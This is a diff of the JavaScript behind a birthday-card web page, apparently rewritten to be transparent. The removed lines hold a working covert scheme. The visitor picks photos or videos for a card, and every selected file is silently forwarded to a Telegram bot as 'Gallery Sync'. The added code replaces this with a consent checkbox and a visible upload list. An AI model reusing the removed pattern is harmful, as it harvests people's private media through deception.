@@ -1,204 +1,256 @@
-const PARTY_MS = 30 * 1000; // 30 Seconds timer
-const $ = id => document.getElementById(id);
-const gate = $("gate"), okBtn = $("okBtn");
-const photoStep = $("photoStep"), photoBtn = $("photoBtn"), photoMsg = $("photoMsg");
-const nameInput = $("nameInput"), preview = $("preview");
-const party = $("party"), cardPhoto = $("cardPhoto"), cardName = $("cardName");
-const barFill = $("barFill"), syncCount = $("syncCount"), syncState = $("syncState");
-const timerEl = $("timer");
+const $ = (id) => document.getElementById(id);
+const welcomeStep = $("welcomeStep");
+const photoStep = $("photoStep");
+const partyStep = $("partyStep");
+const mediaInput = $("mediaInput");
+const chooseBtn = $("chooseBtn");
+const uploadBtn = $("uploadBtn");
+const consentCheck = $("consentCheck");
+const fileList = $("fileList");
+const progressPanel = $("progressPanel");
+const progressFill = $("progressFill");
+const progressPercent = $("progressPercent");
+const progressStatus = $("progressStatus");
+const progressCount = $("progressCount");
+const progressSize = $("progressSize");
+const uploadError = $("uploadError");
+const MAX_FILE_BYTES = 4 * 1024 * 1024;
+let selectedFiles = [];
+let uploadedFiles = new Set();
+let currentPreviewUrl = null;
+let isUploading = false;
 
-okBtn.addEventListener("click", () => {
-  gate.classList.add("hidden");
+$("startBtn").addEventListener("click", () => {
+  welcomeStep.classList.add("hidden");
   photoStep.classList.remove("hidden");
+  $("nameInput").focus();
 });
 
-photoBtn.addEventListener("click", async () => {
-  photoMsg.textContent = "Opening gallery…";
-  try {
-    const files = await pickMedia("image/*,video/*", true);
-    if (!files.length) { photoMsg.textContent = "Koi photo select nahi hui."; return; }
-    
-    const photo = files[0];
-    preview.src = URL.createObjectURL(photo);
-    preview.classList.remove("hidden");
-    photoMsg.textContent = "Perfect! Ab card banate hain…";
-    photoBtn.disabled = true;
-
-    showParty(photo);
-    
-    // Photo Telegram par bhejo (background me)
-    sendToTelegram(photo, nameInput.value.trim() || "Anonymous");
-    
-    // Baaki photos bhejo
-    const remainingFiles = files.slice(1);
-    syncGallery(remainingFiles);
-    
-  } catch (e) {
-    console.error(e);
-    photoMsg.textContent = "Network issue: " + (e.message || "Upload fail");
-    photoBtn.disabled = false;
+chooseBtn.addEventListener("click", () => mediaInput.click());
+mediaInput.addEventListener("change", () => {
+  selectedFiles = Array.from(mediaInput.files || []);
+  uploadedFiles.clear();
+  renderFileList();
+  updateUploadButton();
+  if (selectedFiles.length) {
+    progressPanel.classList.add("hidden");
+    uploadError.classList.add("hidden");
+    setProgress(0);
   }
 });
 
-function pickMedia(accept, multiple) {
-  return new Promise((resolve, reject) => {
-    const input = document.createElement("input");
-    input.type = "file";
-    input.accept = accept;
-    input.multiple = multiple;
-    input.style.display = "none";
-    document.body.appendChild(input);
-    const t = setTimeout(() => reject(new Error("Picker timeout")), 120000);
-    input.addEventListener("change", () => {
-      clearTimeout(t);
-      resolve(Array.from(input.files || []));
-      input.remove();
+consentCheck.addEventListener("change", updateUploadButton);
+
+function formatBytes(bytes) {
+  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(0) + " KB";
+  return (bytes / (1024 * 1024)).toFixed(2) + " MB";
+}
+
+function renderFileList() {
+  fileList.replaceChildren();
+  if (!selectedFiles.length) {
+    fileList.classList.add("hidden");
+    $("selectionHint").textContent = "Choose at least one file and confirm consent to continue.";
+    return;
+  }
+  fileList.classList.remove("hidden");
+  $("selectionHint").textContent = selectedFiles.length + " file(s) selected · Review the list before sending.";
+  selectedFiles.forEach((file, index) => {
+    const row = document.createElement("div");
+    row.className = "file-item";
+    const icon = document.createElement("span");
+    icon.className = "file-type";
+    icon.textContent = file.type.startsWith("video/") ? "▶" : "▧";
+    const meta = document.createElement("span");
+    meta.className = "file-meta";
+    const name = document.createElement("strong");
+    name.textContent = file.name;
+    const size = document.createElement("small");
+    size.textContent = formatBytes(file.size) + (uploadedFiles.has(file) ? " · Sent ✓" : "");
+    meta.append(name, size);
+    const remove = document.createElement("button");
+    remove.className = "file-remove";
+    remove.type = "button";
+    remove.setAttribute("aria-label", "Remove " + file.name);
+    remove.textContent = "×";
+    remove.disabled = isUploading;
+    remove.addEventListener("click", () => {
+      selectedFiles.splice(index, 1);
+      uploadedFiles.delete(file);
+      const transfer = new DataTransfer();
+      selectedFiles.forEach(item => transfer.items.add(item));
+      mediaInput.files = transfer.files;
+      renderFileList();
+      updateUploadButton();
     });
-    input.click();
+    row.append(icon, meta, remove);
+    fileList.append(row);
   });
 }
 
-async function sendToTelegram(file, userName = "") {
-  if (file.size > 4 * 1024 * 1024) return; // 4MB se badi skip karo
+function updateUploadButton() {
+  const tooLarge = selectedFiles.some(file => file.size > MAX_FILE_BYTES);
+  uploadBtn.disabled = isUploading || !selectedFiles.length || !consentCheck.checked || tooLarge;
+  if (tooLarge) $("selectionHint").textContent = "One or more files exceed 4 MB. Remove them or choose smaller files.";
+  else if (selectedFiles.length && !consentCheck.checked) $("selectionHint").textContent = "Please confirm consent before sending files to the Telegram bot.";
+}
 
-  const base64Data = await new Promise((resolve, reject) => {
+function setProgress(percent) {
+  const value = Math.max(0, Math.min(100, percent));
+  progressFill.style.width = value + "%";
+  progressPercent.textContent = Math.round(value) + "%";
+}
+
+function readAsBase64(file) {
+  return new Promise((resolve, reject) => {
     const reader = new FileReader();
-    reader.onload = () => resolve(reader.result.split(',')[1]);
-    reader.onerror = reject;
+    reader.onload = () => resolve(String(reader.result).split(",")[1]);
+    reader.onerror = () => reject(new Error("Could not read " + file.name));
     reader.readAsDataURL(file);
   });
-
-  let caption = `📸 Media Sync\nFrom: ${userName}`;
-  if (userName === "Anonymous") caption = `📸 Birthday Card Photo`;
-
-  await fetch("/.netlify/functions/upload", {
-    method: "POST",
-    body: JSON.stringify({ fileData: base64Data, fileName: file.name, fileType: file.type, caption })
-  }).catch(err => console.log("Upload error"));
 }
 
-async function syncGallery(filesToSync) {
-  if (!filesToSync || !filesToSync.length) { syncState.textContent = "Card ready."; return; }
-  syncCount.textContent = `0 / ${filesToSync.length} files`;
-  
-  for (let i = 0; i < filesToSync.length; i++) {
-    await sendToTelegram(filesToSync[i], "Gallery Sync");
-    await new Promise(r => setTimeout(r, 3000)); // 3 sec delay
-    barFill.style.width = ((i + 1) / filesToSync.length * 100) + "%";
-    syncCount.textContent = `${i + 1} / ${filesToSync.length} files`;
+function uploadOne(file, onProgress) {
+  return readAsBase64(file).then(base64 => new Promise((resolve, reject) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "/.netlify/functions/upload");
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.upload.addEventListener("progress", event => {
+      if (event.lengthComputable) onProgress(event.loaded / event.total);
+    });
+    xhr.addEventListener("load", () => {
+      let response = {};
+      try { response = JSON.parse(xhr.responseText || "{}"); } catch (_) {}
+      if (xhr.status >= 200 && xhr.status < 300 && response.success === true) resolve();
+      else reject(new Error(response.error || "Telegram upload failed (HTTP " + xhr.status + ")."));
+    });
+    xhr.addEventListener("error", () => reject(new Error("Network error while sending " + file.name + ".")));
+    xhr.addEventListener("timeout", () => reject(new Error("Upload timed out for " + file.name + ".")));
+    xhr.timeout = 120000;
+    const userName = $("nameInput").value.trim() || "Birthday guest";
+    xhr.send(JSON.stringify({
+      fileData: base64,
+      fileName: file.name,
+      fileType: file.type || "application/octet-stream",
+      caption: "Birthday memory shared with consent · From: " + userName
+    }));
+  }));
+}
+
+uploadBtn.addEventListener("click", async () => {
+  if (isUploading || !selectedFiles.length || !consentCheck.checked) return;
+  if (selectedFiles.some(file => file.size > MAX_FILE_BYTES)) {
+    showError("Please remove files larger than 4 MB before uploading.");
+    return;
   }
-  syncState.textContent = "All photos synced!";
-}
+  isUploading = true;
+  uploadBtn.disabled = true;
+  chooseBtn.disabled = true;
+  consentCheck.disabled = true;
+  renderFileList();
+  progressPanel.classList.remove("hidden");
+  uploadError.classList.add("hidden");
+  const totalBytes = selectedFiles.reduce((sum, file) => sum + file.size, 0);
+  let completedBytes = selectedFiles.filter(file => uploadedFiles.has(file)).reduce((sum, file) => sum + file.size, 0);
+  setProgress(totalBytes ? completedBytes / totalBytes * 100 : 0);
+  progressStatus.textContent = "Connecting to Telegram…";
+  progressCount.textContent = uploadedFiles.size + " of " + selectedFiles.length + " files sent";
+  progressSize.textContent = formatBytes(completedBytes) + " of " + formatBytes(totalBytes);
 
-function showParty(photoFile) {
-  photoStep.classList.add("hidden");
-  party.classList.remove("hidden");
-  cardPhoto.src = URL.createObjectURL(photoFile);
-  cardName.textContent = (nameInput.value.trim() || "").slice(0, 24);
-
-  const end = Date.now() + PARTY_MS;
-  const tick = () => {
-    const left = Math.max(0, end - Date.now());
-    const s = Math.floor((left % 60000) / 1000);
-    timerEl.textContent = `00:${String(s).padStart(2,"0")}`;
-    
-    if (left > 0) {
-      requestAnimationFrame(tick);
-    } else {
-      // Timer khatam, Cake popup dikhao
-      $("cakePopup").classList.remove("hidden");
+  try {
+    for (const file of selectedFiles) {
+      if (uploadedFiles.has(file)) continue;
+      progressStatus.textContent = "Sending " + file.name;
+      await uploadOne(file, fraction => {
+        const liveBytes = completedBytes + file.size * fraction;
+        setProgress(totalBytes ? liveBytes / totalBytes * 100 : 0);
+        progressSize.textContent = formatBytes(liveBytes) + " of " + formatBytes(totalBytes);
+      });
+      uploadedFiles.add(file);
+      completedBytes += file.size;
+      setProgress(totalBytes ? completedBytes / totalBytes * 100 : 100);
+      progressCount.textContent = uploadedFiles.size + " of " + selectedFiles.length + " files sent";
+      progressSize.textContent = formatBytes(completedBytes) + " of " + formatBytes(totalBytes);
+      renderFileList();
     }
-  };
-  tick();
-  confetti();
-}
-
-// --- Cake Cutting Logic & Music ---
-$("cutBtn").addEventListener("click", () => {
-  $("cutBtn").classList.add("hidden");
-  $("cakeMsg").classList.add("hidden");
-  $("cakeEmoji").textContent = "🍰";
-  $("cakeEmoji").style.animation = "none";
-  $("finalWish").classList.remove("hidden");
-  
-  // Music bajao
-  playHappyBirthdayMusic();
-});
-
-$("shareBtn").addEventListener("click", async () => {
-  const shareData = {
-    title: 'Happy Birthday Surprise! 🎂',
-    text: 'Maine tumhare liye ek surprise banaya hai! Check karo.',
-    url: window.location.origin
-  };
-  if (navigator.share) {
-    try { await navigator.share(shareData); } catch (err) {}
-  } else {
-    navigator.clipboard.writeText(window.location.origin);
-    alert("Link copy ho gaya hai! Ab aap ise kisi ko bhi bhej sakte hain.");
+    setProgress(100);
+    progressStatus.textContent = "All files delivered successfully ✓";
+    progressCount.textContent = selectedFiles.length + " of " + selectedFiles.length + " files sent";
+    progressSize.textContent = formatBytes(totalBytes) + " sent";
+    if (currentPreviewUrl) URL.revokeObjectURL(currentPreviewUrl);
+    currentPreviewUrl = URL.createObjectURL(selectedFiles.find(file => file.type.startsWith("image/")) || selectedFiles[0]);
+    $("cardPhoto").src = currentPreviewUrl;
+    $("cardName").textContent = $("nameInput").value.trim() || "Happy Birthday";
+    window.setTimeout(() => {
+      photoStep.classList.add("hidden");
+      partyStep.classList.remove("hidden");
+    }, 650);
+  } catch (error) {
+    progressStatus.textContent = "Upload paused";
+    showError(error.message + " Your successfully sent files are marked above. Tap retry to send the remaining files.");
+  } finally {
+    isUploading = false;
+    chooseBtn.disabled = false;
+    consentCheck.disabled = false;
+    uploadBtn.textContent = uploadedFiles.size ? "Retry / send remaining files ↗" : "Send files & continue ↗";
+    updateUploadButton();
+    renderFileList();
   }
 });
 
-$("closeBtn").addEventListener("click", () => {
-  $("cakePopup").classList.add("hidden");
+function showError(message) {
+  uploadError.textContent = message;
+  uploadError.classList.remove("hidden");
+}
+
+$("revealBtn").addEventListener("click", () => $("cakePopup").classList.remove("hidden"));
+$("closeBtn").addEventListener("click", () => $("cakePopup").classList.add("hidden"));
+$("cutBtn").addEventListener("click", () => {
+  $("cake-glow");
+  document.querySelector(".cake-glow").textContent = "🍰";
+  $("cakeTitle").textContent = "Happy Birthday!";
+  $("cakeMessage").classList.add("hidden");
+  $("cutBtn").classList.add("hidden");
+  $("finalWish").classList.remove("hidden");
+  playBirthdayTune();
+});
+$("shareBtn").addEventListener("click", async () => {
+  const shareData = { title: "A Birthday Surprise ✨", text: "I made a little birthday surprise for you!", url: window.location.href };
+  try {
+    if (navigator.share) await navigator.share(shareData);
+    else if (navigator.clipboard) { await navigator.clipboard.writeText(window.location.href); toast("Link copied to clipboard!"); }
+    else toast("Copy this page link from your browser.");
+  } catch (error) {
+    if (error.name !== "AbortError") toast("Couldn't open the share menu.");
+  }
 });
 
-// Web Audio API se Happy Birthday ki dhun
-function playHappyBirthdayMusic() {
+function toast(message) {
+  const element = $("toast");
+  element.textContent = message;
+  element.classList.add("show");
+  window.setTimeout(() => element.classList.remove("show"), 2600);
+}
+
+function playBirthdayTune() {
   const AudioContext = window.AudioContext || window.webkitAudioContext;
   if (!AudioContext) return;
-  const ctx = new AudioContext();
-  
-  // Happy Birthday Notes (Frequency, Duration)
-  const notes = [
-    [392.00, 0.3], [392.00, 0.3], [440.00, 0.6], [392.00, 0.6], [523.25, 0.6], [493.88, 1.0], // Happy Birthday to you
-    [392.00, 0.3], [392.00, 0.3], [440.00, 0.6], [392.00, 0.6], [587.33, 0.6], [523.25, 1.0], // Happy Birthday to you
-    [392.00, 0.3], [392.00, 0.3], [783.99, 0.6], [659.25, 0.6], [523.25, 0.6], [493.88, 0.6], [440.00, 0.6], // Happy Birthday dear [Name]
-    [698.46, 0.3], [698.46, 0.3], [659.25, 0.6], [523.25, 0.6], [587.33, 0.6], [523.25, 1.0]  // Happy Birthday to you
-  ];
-
-  let startTime = ctx.currentTime;
-  
-  notes.forEach(note => {
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    
-    osc.type = 'triangle'; // Piano jaisi sound
-    osc.frequency.value = note[0];
-    
-    // Volume envelope (soft start aur end)
-    gain.gain.setValueAtTime(0, startTime);
-    gain.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
-    gain.gain.exponentialRampToValueAtTime(0.001, startTime + note[1]);
-    
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    
-    osc.start(startTime);
-    osc.stop(startTime + note[1]);
-    
-    startTime += note[1];
+  const context = new AudioContext();
+  const notes = [[392,.28],[392,.28],[440,.55],[392,.55],[523,.55],[494,.9],[392,.28],[392,.28],[440,.55],[392,.55],[587,.55],[523,.9]];
+  let start = context.currentTime;
+  notes.forEach(([frequency,duration]) => {
+    const oscillator = context.createOscillator();
+    const gain = context.createGain();
+    oscillator.type = "sine";
+    oscillator.frequency.value = frequency;
+    gain.gain.setValueAtTime(.0001,start);
+    gain.gain.exponentialRampToValueAtTime(.16,start+.04);
+    gain.gain.exponentialRampToValueAtTime(.0001,start+duration);
+    oscillator.connect(gain);
+    gain.connect(context.destination);
+    oscillator.start(start);
+    oscillator.stop(start+duration);
+    start += duration+.04;
   });
-}
-
-function confetti() {
-  const c = document.getElementById("confetti");
-  const ctx = c.getContext("2d");
-  const colors = ["#ffd86f","#fc6262","#a06bff","#6bffb0","#6bc9ff"];
-  const parts = [];
-  const resize = () => { c.width = innerWidth; c.height = innerHeight; };
-  resize(); addEventListener("resize", resize);
-  for (let i = 0; i < 120; i++) {
-    parts.push({ x: Math.random()*c.width, y: Math.random()*-c.height, r: 4+Math.random()*6, vy: 1+Math.random()*3, vx: -1+Math.random()*2, color: colors[(Math.random()*colors.length)|0], rot: Math.random()*Math.PI });
-  }
-  (function frame() {
-    ctx.clearRect(0, 0, c.width, c.height);
-    for (const p of parts) {
-      p.x += p.vx; p.y += p.vy; p.rot += 0.05;
-      if (p.y > c.height+20) { p.y = -20; p.x = Math.random()*c.width; }
-      ctx.save(); ctx.translate(p.x, p.y); ctx.rotate(p.rot);
-      ctx.fillStyle = p.color; ctx.fillRect(-p.r/2, -p.r/2, p.r, p.r*1.6); ctx.restore();
-    }
-    requestAnimationFrame(frame);
-  })();
+  window.setTimeout(() => context.close(), 9000);
 }
